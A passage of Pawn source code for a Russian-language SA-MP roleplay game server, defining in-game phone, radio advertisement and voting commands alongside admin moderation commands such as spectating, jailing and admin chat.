			levels = cache_get_field_content_int(i,"level");
            format(strin,sizeof(strin),"%s\t%i\n",Names, levels);
			if(levels) strcat(query, strin);
		}
	}
	ShowPlayerDialogEx(playerid, 21025, DIALOG_STYLE_TABLIST_HEADERS, "Управление администраторами", query, "Выбор", "Отмена");
	return true;
}
CMD:call(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "d",params[0]))
	{
		ShowPlayerDialogEx(playerid, 9956, DIALOG_STYLE_LIST, "Выберите сервис", "[1] Полиция \n[2] Скорая помощь \n[3] Таксопарк\n[4] Автомастерская", "Выбрать", "Назад");
		return true;
	}
	if(Mobile[playerid] != 999) return SCM(playerid, COLOR_GRAD2, " Вы уже разговариваете по телефону ");
	format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	GetPlayerPos(playerid,CallInfo[playerid][callx],CallInfo[playerid][cally],CallInfo[playerid][callz]);
	CallInfo[playerid][callused] = 1;
	if(params[0] == PTEMP[playerid][pPnumber])
	{
		SCM(playerid, COLOR_GRAD2, " Линия занята");
		SetPlayerSpecialAction(playerid,13);
		return true;
	}
	if(params[0] == 11888)
	{
		if(smsls == -1) return SCM(playerid, COLOR_GREY, " Приём звонков отключён.");
		if(smsls == playerid || smssf == playerid || smslv == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете позвонить в эфир!");
		if(zvonok[0] != -1) return SCM(playerid, COLOR_GREY, " Линия занята!");
		format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s[%i]",Name(playerid), playerid);
		SCM(smsls, -1, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(smsls));
		ProxDetector(30.0, smsls, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerSpecialAction(playerid,11);
		zvonok[0] = playerid;
		PTEMP[playerid][pMobile] += smspricels;
		FracBank[0][fLsnews] += smspricels;
		return true;
	}
	if(params[0] == 11555)
	{
		if(smssf == -1) return SCM(playerid, COLOR_GREY, " Приём звонков отключён.");
		if(smsls == playerid || smssf == playerid || smslv == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете позвонить в эфир!");
		if(zvonok[1] != -1) return SCM(playerid, COLOR_GREY, " Линия занята!");
		format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s[%i]",Name(playerid), playerid);
		SCM(smssf, -1, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(smssf));
		ProxDetector(30.0, smssf, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerSpecialAction(playerid,11);
		PTEMP[playerid][pMobile] += smspricels;
		FracBank[0][fSfnews] += smspricels;
		zvonok[1] = playerid;
		return true;
	}
	if(params[0] == 11333)
	{
		if(smslv == -1) return SCM(playerid, COLOR_GREY, " Приём звонков отключён.");
		if(smsls == playerid || smssf == playerid || smslv == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете позвонить в эфир!");
		if(zvonok[2] != -1) return SCM(playerid, COLOR_GREY, " Линия занята!");
		format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s[%i]",Name(playerid), playerid);
		SCM(smslv, -1, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(smslv));
		ProxDetector(30.0, smslv, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerSpecialAction(playerid,11);
		PTEMP[playerid][pMobile] += smspricels;
		FracBank[0][fLvnews] += smspricels;
		zvonok[2] = playerid;
		return true;
	}
	foreach(i)
	{
		if(PTEMP[i][pPnumber] == params[0] && params[0] != 0)
		{
			Mobile[playerid] = i;
			if(!IsPlayerConnected(i)) return true;
			if(PhoneOnline[Mobile[playerid]] > 0) return SCM(playerid, COLOR_GREY, " Телефон абонента выключен...");
			if(Mobile[Mobile[playerid]] == 999)
			{
				format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s",Name(playerid));
				SCM(Mobile[playerid], -1, YCMDstr);
				PlayerPlaySound(Mobile[playerid], 20600, 0.0, 0.0, 0.0);
				format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(i));
				ProxDetector(30.0, i, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SetPlayerSpecialAction(playerid,11);
				CellTime[playerid] = 1;
				return true;
			}
		}
	}
	if(Mobile[playerid] == -1)
	{
		SCM(playerid, COLOR_GRAD2, " Телефон вне зоны доступа сети");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		return true;
	}
	return true;
}
CMD:pickup(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(Mobile[playerid] != 999) return SCM(playerid, COLOR_GRAD2, " Вы уже разговариваете по телефону");
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			if(Mobile[i] == playerid)
			{
				Mobile[playerid] = i;
				SCM(i, COLOR_GRAD2, " Поднял(а) трубку телефона.");
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
				format(YCMDstr, sizeof(YCMDstr), " %s ответил на звонок", Name(playerid));
				ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				PlayerPlaySound(playerid, 1069, 0.0, 0.0, 0.0);
				GetPlayerPos(playerid,CallInfo[playerid][callx],CallInfo[playerid][cally],CallInfo[playerid][callz]);
				CallInfo[playerid][callused] = 1;
			}
		}
	}
    if(PTEMP[playerid][pMember] == 9 && smssf == playerid)
    {
        if(zvonok[1] != -1)
		{
	        Tel[zvonok[1]] = 1;
			SendMes(playerid, COLOR_YELLOW, " %s попал в эфир", Name(zvonok[1]));
			SCM(zvonok[1], COLOR_YELLOW, " Вы попали в студию, говорите.");
			TalkingLive[zvonok[1]] = 1;
			PTEMP[zvonok[1]][pMobile] -= smspricesf;
			FracBank[0][fSfnews] += smspricesf;
		} else return SCM(playerid, COLOR_GREY, " Никто не звонит");
	}
    else if(PTEMP[playerid][pMember] == 16 && smsls == playerid)
    {
        if(zvonok[0] != -1)
        {
	    	Tel[zvonok[0]] = 1;
	    	SendMes(playerid, COLOR_YELLOW, " %s попал в эфир", Name(zvonok[0]));
			SCM(zvonok[0], COLOR_YELLOW, " Вы попали в студию, говорите.");
			TalkingLivels[zvonok[0]] = 1;
			PTEMP[zvonok[0]][pMobile] -= smspricels;
			FracBank[0][fLsnews] += smspricels;
		} else return SCM(playerid, COLOR_GREY, " Никто не звонит");
    }
    else if(PTEMP[playerid][pMember] == 20 && smslv == playerid)
    {
    	if(zvonok[2] != -1)
		{
			Tel[zvonok[2]] = 1;
	    	SendMes(playerid, COLOR_YELLOW, " %s попал в эфир", Name(zvonok[2]));
			SCM(zvonok[2], COLOR_YELLOW, " Вы попали в студию, говорите.");
			TalkingLivelv[zvonok[2]] = 1;
			PTEMP[zvonok[2]][pMobile] -= smspricelv;
			FracBank[0][fLvnews] += smspricelv;
		} else return SCM(playerid, COLOR_GREY, " Никто не звонит");
    }
    else return SCM(playerid, COLOR_GREY, " Вам никто не звонит");
	return true;
}
CMD:hangup(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(IsPlayerConnected(Mobile[playerid]))
	{
		if(Mobile[playerid] != 999)
		{
			SCM(Mobile[playerid], COLOR_GRAD2, " Абонент положил(a) трубку");
			SetPlayerSpecialAction(Mobile[playerid],SPECIAL_ACTION_STOPUSECELLPHONE);
			CellTime[Mobile[playerid]] = 0;
			CellTime[playerid] = 0;
			Mobile[Mobile[playerid]] = 999;
			SCM(playerid, COLOR_GRAD2, " Вы повесили трубку");
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
			Mobile[playerid] = 999;
			Mobile[Mobile[playerid]] = 999;
			CellTime[playerid] = 0;
		}
	}
    if(PTEMP[playerid][pMember] == 9 && smssf == playerid && zvonok[1] != -1)
    {
        SCM(zvonok[1], COLOR_GREY, " Он повесил трубку!");
        SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[1],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[1]] = 255;
		TalkingLive[zvonok[1]] = 255;
		zvonok[1] = -1;
    }
    else if(PTEMP[playerid][pMember] == 16 && smsls == playerid && zvonok[0] != -1)
    {
		SCM(zvonok[0], COLOR_GREY, " Он повесил трубку!");
		SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetPlayerSpecialAction(zvonok[0],SPECIAL_ACTION_STOPUSECELLPHONE);
        Tel[zvonok[0]] = 255;
		TalkingLivels[zvonok[0]] = 255;
		zvonok[0] = -1;
    }
    else if(PTEMP[playerid][pMember] == 20 && smslv == playerid && zvonok[2] != -1)
    {
		SCM(zvonok[2], COLOR_GREY, " Он повесил трубку!");
		SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetPlayerSpecialAction(zvonok[2],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[2]] = 255;
		TalkingLivelv[zvonok[2]] = 255;
		zvonok[2] = -1;
    }
    else if(zvonok[1] == playerid)
    {
    	SCM(smssf, COLOR_GREY, " Он повесил трубку!");
    	SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(smssf,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[1],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[1]] = 255;
		TalkingLive[zvonok[1]] = 255;
		zvonok[1] = -1;
    }
	else if(zvonok[0] == playerid)
    {
    	SCM(smsls, COLOR_GREY, " Он повесил трубку!");
    	SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(smssf,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[0],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[0]] = 255;
		TalkingLivels[zvonok[0]] = 255;
		zvonok[0] = -1;
    }
    else if(zvonok[2] == playerid)
    {
    	SCM(smslv, COLOR_GREY, " Он повесил трубку!");
    	SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(smssf,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[2],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[2]] = 255;
		TalkingLivelv[zvonok[2]] = 255;
		zvonok[2] = -1;
    }
	return true;
}
CMD:vote(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new voteid = -1;
	if(gNews[playerid] == 0)
	{
	    for(new i = 0; i < 10; i++)
	    {
	        if(VoteNews[sfn][i][vactive] == 1)
	        {
				voteid = i;
				break;
	        }
	    }
	    if(VoteNews[sfn][voteid][vlevel] > PTEMP[playerid][pLevel]) return SCM(playerid, COLOR_GREY, " Это голосование не доступно для Вас.");
		if(strlen(VoteNews[sfn][voteid][vquestion]) == 0) return ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[sfn][voteid][vcaption], VoteNews[sfn][voteid][vcaption],"Далее", "Отмена");
		ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[sfn][voteid][vcaption], VoteNews[sfn][voteid][vquestion],"Далее", "Отмена");
		
	}
	else if(lNews[playerid] == 0)
	{
		for(new i = 0; i < 10; i++)
	    {
	        if(VoteNews[lsn][i][vactive] == 1)
	        {
				voteid = i;
				break;
	        }
	    }
	    if(VoteNews[lsn][voteid][vlevel] > PTEMP[playerid][pLevel]) return SCM(playerid, COLOR_GREY, " Это голосование не доступно для Вас.");
		if(strlen(VoteNews[lsn][voteid][vquestion]) == 0) return ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lsn][voteid][vcaption], VoteNews[sfn][voteid][vcaption],"Далее", "Отмена");
		ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lsn][voteid][vcaption], VoteNews[lsn][voteid][vquestion],"Далее", "Отмена");
	}
	else if(LvNews[playerid] == 0)
	{
		for(new i = 0; i < 10; i++)
	    {
	        if(VoteNews[lvn][i][vactive] == 1)
	        {
				voteid = i;
				break;
	        }
	    }
	    if(VoteNews[lvn][voteid][vlevel] > PTEMP[playerid][pLevel]) return SCM(playerid, COLOR_GREY, " Это голосование не доступно для Вас.");
		if(strlen(VoteNews[lvn][voteid][vquestion]) == 0) return ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lvn][voteid][vcaption], VoteNews[sfn][voteid][vcaption],"Далее", "Отмена");
		ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lvn][voteid][vcaption], VoteNews[lvn][voteid][vquestion],"Далее", "Отмена");
	}
	else return SCM(playerid, COLOR_GREY, " У вас не включено радио! {FFFFFF}(( /switchvawe ))");
	return true;
}
CMD:ad(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: /ad [ текст ]");
	if(PTEMP[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	//if(PTEMP[playerid][pLevel] < 3) return SCM(playerid, COLOR_GREY, "Подать обьявление можно с 3 левела");
	if(AdvertTime > gettime()) return SCM(playerid, COLOR_GREY, " Объявления можно дать через 15 секунд!");
	if(gNews[playerid] == 1 && lNews[playerid] == 1 && LvNews[playerid] == 1) return SCM(playerid, -1, "{B8B8B8} Вы не выбрали через какую радиостанцию подавать объявление. {FFFFFF}(( Используйте /radio ))");
	strmid (ReportQ[playerid],params[0], 0, strlen(params[0]), 128);
	if(lNews[playerid] == 0)
	{
	    if(PTEMP[playerid][pCash] < strlen(params[0])*addd[0]) return SendMes(playerid, COLOR_GREY, " Нужно %i вирт", strlen(params[0])*addd[0]);
		format(YCMDstr,sizeof(YCMDstr),"{B8B8B8}Вы собираетесь отправить объявление:\n               {00FF5E}%s\n\n{B8B8B8}Стоимость:{00FF5E} %i вирт\n\n\n{56839C}Объявление будет подано после проверки!\nСпасибо что воспользовались услугами "NameServer" LS NEWS",params[0],strlen(params[0])*addd[0]);
		ShowPlayerDialogEx(playerid,8454,DIALOG_STYLE_MSGBOX,"{FFFFFF}Проверка",YCMDstr,"Отправить","Отмена");
	}
	else if(gNews[playerid] == 0)
	{
	    if(PTEMP[playerid][pCash] < strlen(params[0])*addd[0]) return SendMes(playerid, COLOR_GREY, " Нужно %i вирт", strlen(params[0])*addd[1]);
		format(YCMDstr,sizeof(YCMDstr),"{B8B8B8}Вы собираетесь отправить объявление:\n               {00FF5E}%s\n\n{B8B8B8}Стоимость:{00FF5E} %i вирт\n\n\n{56839C}Объявление будет подано после проверки!\nСпасибо что воспользовались услугами "NameServer" SF NEWS",params[0],strlen(params[0])*addd[1]);
		ShowPlayerDialogEx(playerid,8455,DIALOG_STYLE_MSGBOX,"{FFFFFF}Проверка",YCMDstr,"Отправить","Отмена");
	}
	else if(LvNews[playerid] == 0)
	{
	    if(PTEMP[playerid][pCash] < strlen(params[0])*addd[0]) return SendMes(playerid, COLOR_GREY, " Нужно %i вирт", strlen(params[0])*addd[2]);
		format(YCMDstr,sizeof(YCMDstr),"{B8B8B8}Вы собираетесь отправить объявление:\n               {00FF5E}%s\n\n{B8B8B8}Стоимость:{00FF5E} %i вирт\n\n\n{56839C}Объявление будет подано после проверки!\nСпасибо что воспользовались услугами "NameServer" LV NEWS",params[0],strlen(params[0])*addd[2]);
		ShowPlayerDialogEx(playerid,8456,DIALOG_STYLE_MSGBOX,"{FFFFFF}Проверка",YCMDstr,"Отправить","Отмена");
	}
	return true;
}
CMD:time(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && PlayerCuffedTime[playerid] == 0) ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_watch",4.1,0,0,0,0,0);
	SetPlayerChatBubble (playerid, "Взглянул на часы", COLOR_PURPLE, 30.0, 10000);
	new mtext[20];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "January"; }
	else if(month == 2) { mtext = "February"; }
	else if(month == 3) { mtext = "March"; }
	else if(month == 4) { mtext = "April"; }
	else if(month == 5) { mtext = "May"; }
	else if(month == 6) { mtext = "June"; }
	else if(month == 7) { mtext = "July"; }
	else if(month == 8) { mtext = "August"; }
	else if(month == 9) { mtext = "September"; }
	else if(month == 10) { mtext = "October"; }
	else if(month == 11) { mtext = "November"; }
	else if(month == 12) { mtext = "December"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	FixHour(hour);
	hour = shifthour;
	if(PTEMP[playerid][pJailTime] > 0) format(YCMDstr, sizeof(YCMDstr), "~y~%02i %s~n~~g~~w~%02i:%02i~n~~w~Jail Time Left: %i sec~n~~g~Server 01", day, mtext, hour, minuite, PTEMP[playerid][pJailTime]);
	else format(YCMDstr, sizeof(YCMDstr), "~y~%02i %s~n~~g~~w~%02i:%02i~n~~g~Server "NumberServer, day, mtext, hour, minuite);
	GameTextForPlayer(playerid, YCMDstr, 5000, 1);
	return true;
}
CMD:house(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /house [номер дома]");
	SetPlayerPos(playerid,HouseInfo[params[0]][hEntrancex],HouseInfo[params[0]][hEntrancey],HouseInfo[params[0]][hEntrancez]);
	GameTextForPlayer(playerid, "~w~HOUSE", 5000, 1);
	return true;
}
CMD:chat(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(!BigEar[playerid]) BigEar[playerid] = 1, SCM(playerid, COLOR_GRAD2, " Слушать чат ON");
	else if(BigEar[playerid]) BigEar[playerid] = 0, SCM(playerid, COLOR_GRAD2, " Слушать чат OFF");
	return true;
}
CMD:recon(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return 1;
	if(!strcmp(params,"OFF",true) && Spectate[playerid]) return StopSpectate(playerid);
	if(!Spectate[playerid] && !strcmp(params,"OFF",true)) return SCM(playerid, COLOR_GREY, " Вы не в режиме наблюдения!");
	if(sscanf(params, "u",params[0]))
	{
		if(SpecAd[playerid] != INVALID_PLAYER_ID) SpecID[SpecAd[playerid]] = 65535;
		SpecAd[playerid] = 65535;
		if(!Spectate[playerid])
		{
			GetPlayerPos(playerid,SpecPlayer[playerid][0],SpecPlayer[playerid][1],SpecPlayer[playerid][2]);
			SpecPlayerInt[playerid] = GetPlayerInterior(playerid);
			SpecPlayerWorld[playerid] = GetPlayerVirtualWorld(playerid);
			GetPlayerFacingAngle(playerid, SpecPlayerAngle[playerid]);
		}
		ReconSelect[playerid] = 7;
		ReconSelectSub[playerid] = INVALID_TEXT_DRAW;

		for(new i = 7; i < 35; i++)
		DisableEnableReconButton(playerid, i, 0, 0);

		for(new i = 0; i < 16; i++)
		PlayerTextDrawShow(playerid, ReconPlayer[i]);

		DisableEnableReconButton(playerid, ReconSelect[playerid], 1);

		Spectate[playerid] = 1;
		TogglePlayerSpectating(playerid, 1);
		printf("Администратор %s вышел из режима наблюдения", Name(playerid));
		return 1;
	}
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн / не залогинен");
	if(PTEMP[playerid][pAdmin] < PTEMP[params[0]][pAdmin]-1) return SCM(playerid, COLOR_GREY, " Наблюдение за администрацией запрещено!");
	if(Spectate[playerid]) return SCM(playerid, COLOR_GREY, " Вы уже наблюдете");
	if(SpecID[params[0]] != 65535) return SCM(playerid, COLOR_GREY, " Этот игрок уже под наблюдением");
	if(!Spectate[playerid])
	{
		GetPlayerPos(playerid,SpecPlayer[playerid][0],SpecPlayer[playerid][1],SpecPlayer[playerid][2]);
		SpecPlayerInt[playerid] = GetPlayerInterior(playerid);
		SpecPlayerWorld[playerid] = GetPlayerVirtualWorld(playerid);
		GetPlayerFacingAngle(playerid, SpecPlayerAngle[playerid]);
	}
	if(SpecAd[playerid] != INVALID_PLAYER_ID) SpecID[SpecAd[playerid]] = 65535;
	SpecAd[playerid] = 65535;
	SpecAd[playerid] = params[0];
	SpecID[params[0]] = playerid;
	//ShowMenuForPlayer(Admin,playerid);
	//PlayerTextDrawShow(playerid, NikPlayer);
	ReconSelect[playerid] = 7;
	ReconSelectSub[playerid] = INVALID_TEXT_DRAW;

	for(new i = 7; i < 35; i++)
	DisableEnableReconButton(playerid, i, 0, 0);

	for(new i = 0; i < 16; i++)
	PlayerTextDrawShow(playerid, ReconPlayer[i]);

	for(new x = 1; x < 11; x++)
	GetPlayerWeaponData(playerid,x,PTEMP[playerid][pWeapon][x-1],PTEMP[playerid][pAmmo][x-1]);

	DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
	Spectate[playerid] = 1;
	SetTimerEx("SpecPlayers", 100, false, "i", playerid);
	printf("Администратор %s начал следить за %s", Name(playerid), Name(params[0]));
	return 1;
}
CMD:alevel(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(PTEMP[playerid][pAdmin] < 7) return true;
	ShowPlayerDialog(playerid, 11486, DIALOG_STYLE_LIST, "Выбор чата", "{FFFF00}[0] Уровни [1-6]\n{00FF00}[1] Уровни [7-10]", "Выбрать", "Отмена");
	return true;
}
CMD:admin(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;//SCM(playerid,-1," Вы не авторизированы");
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: (/a)dmin [текст]");
	if(PTEMP[playerid][pAdmin] > 6)
	{
	    if(!GetPVarInt(playerid, "achat"))
	    {
			SCM(playerid, -1, " Для подальшей смены уровня админ-чата введите /alevel");
	        CallLocalFunction("OnPlayerCommandText", "is", playerid, "/alevel");
	        SetPVarString(playerid, "achat", params[0]);
	        return true;
	    }
		else if(GetPVarInt(playerid, "achat") == 2)
	    {
		    format(YCMDstr, sizeof(YCMDstr), " <ADM-CHAT> %s: %s",PTEMP[playerid][pName],params[0]);
			ABroadCast(COLOR_GREEN,YCMDstr,7);
			printf(YCMDstr);
			return true;
	    }
	}
	format(YCMDstr, sizeof(YCMDstr), " <ADM-CHAT> %s: %s",PTEMP[playerid][pName],params[0]);
	ABroadCast(COLOR_YELLOW,YCMDstr,1);
	printf(YCMDstr);
	return true;
}
CMD:dropmoney(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "ii", params[0], params[1])) return SCM(playerid, -1, " Введите: /dropmoney [0 - с кошелька | 1 - с банка] [сумма]");
	if(params[0] == 0)// pCash
	{
	    if((PTEMP[playerid][pCash]-params[1]) < 0) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
		PTEMP[playerid][pCash]-= params[1];
		SCM(playerid, COLOR_BLUE, " Деньги уничтожены");
	}
	else if(params[0] == 1) // pBank
	{
		if((PTEMP[playerid][pBank]-params[1]) < 0) return SCM(playerid, COLOR_GREY, " У вас недостаточно денег!");
		PTEMP[playerid][pBank]-= params[1];
		SCM(playerid, COLOR_BLUE, " Деньги уничтожены");
	}
	else return SCM(playerid, -1, " Введите: /dropmoney [0 - с кошелька | 1 - с банка] [сумма]");
	return true;
}
CMD:jail(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return SCM(playerid, -1, " Введите: /jail [id игрока] [время(минуты)]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(params[1] > 120) return SCM(playerid, COLOR_GREY, " Игроков можно посадить максимум на 2 часа (120 минут)");
	if(params[1] < 0) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы посадили %s в тюрьму на %i минут",Name(params[0]),params[1]);
	SCM(playerid, COLOR_LIGHTRED, YCMDstr);
	DelGun(params[0]);
	SetPlayerInterior(params[0], 6);
	SetPlayerPos(params[0],264.1425,77.4712,1001.0391);
	SetPlayerFacingAngle(params[0], 263.0160);
	PTEMP[params[0]][pMestoJail] = 1;
	PTEMP[params[0]][pJailTime] = params[1]*60;
	format(YCMDstr, sizeof(YCMDstr), " Вы посажены администратором "NameServer" на %i минут",params[1]);
	SCM(params[0], COLOR_LIGHTRED, YCMDstr);
	printf("Администратор %s посадил в тюрьму %s на %i секунд", Name(playerid), Name(params[0]), params[1]);
	return true;
}
CMD:prison(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /prison [ID] [Время]");
	if(sscanf(params, "ud",params[0],params[1])) params[1] = 600;
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GREY, " Игрок не найден!");
	PTEMP[params[0]][pMestoJail] = 4;
	SetPlayerVirtualWorld(params[0], 1);
	PTEMP[params[0]][pJailTime] = params[1];
	ResetPlayerWeapons(params[0]);
	SetPlayerVirtualWorld(params[0], 1);
	SpawnPlayer(params[0]);
	format(YCMDstr, sizeof(YCMDstr), " Администратор %s посадил в Деморган %s на %i сек", Name(playerid), Name(params[0]), params[1]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	GameTextForPlayer(params[0], "~w~YOU ARE IN ~r~PRISON", 5000, 4);
	SCM(params[0],COLOR_LIGHTRED," Вы помещены в форт ДеМорган администратором "NameServer"");
	printf("Администратор %s посадил в форт Деморган %s на %i секунд", Name(playerid), Name(params[0]), params[1]);
	return 1;
}
CMD:offprison(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4) return true;
	new name[32], time = 0;
	if(sscanf(params, "s[32]", name, time)) return SCM(playerid, -1, " Введите: /offprison [ник] [время]");
	sscanf(params, "s[32]d", name, time);
	if(time == 0) time = 600;
	new id = GetPlayerID(name);
	if(IsPlayerConnected(id)) {
		format(string, sizeof(string), "/prison %i %i", id, time);
		CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
	} else {
	    mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pMestoJail = '4',pJailTime = '%d', pText = '7' WHERE name = '%s'",time, name);
		mysql_function_query(DATABASE,QUERY,false,"","");
		format(YCMDstr, sizeof(YCMDstr), " Администратор %s посадил в offДеморган %s, на %d сек",Name(playerid),name, time);
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		printf("Администратор %s посадил %s в Деморган в оффлайн-режиме на %i сек", PTEMP[playerid][pName], name, time);
	}
	
	return true;
}
CMD:settime(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return	SCM(playerid, -1, " Введите: /settime [время]");
	SetWorldTime(params[0]);
	format(YCMDstr, sizeof(YCMDstr), " Время установлено на %i часов.",params[0]);
	ABroadCast(-1, YCMDstr, 4);
	printf("Администратор %s установил время сервера на %i", Name(playerid), params[0]);
	return true;
}
//#6
CMD:invite(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	new para1;
	new sendername[MAX_PLAYER_NAME];
	new giveplayer[MAX_PLAYER_NAME];
	new ftext[32];
	if(IsPlayerConnected(playerid))
	{
	    if(!CanInvite(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
		if(sscanf(params, "u",para1)) return	SCM(playerid, COLOR_GRAD2, " Введите: /invite [id игрока]");
		if(GetDistanceBetweenPlayers(playerid, para1) < 5.0)
		{
		    new skinid;
		    switch(PTEMP[playerid][pMember])
		    {
		        case 3,19: skinid = 287;
		        case 4: skinid = 274;
		        case 5: skinid = 124;
		        case 6: skinid = 123;
		        case 7: skinid = 57;
		        case 9,16,20: skinid = 188;
		        case 11: skinid = 59;
		        case 12: skinid = 103;
		        case 13: skinid = 108;
		        case 14: skinid = 111;
		        case 15: skinid = 105;
		        case 17: skinid = 114;
		        case 18: skinid = 175;
				case 24,26,29: skinid = 247;
		    }
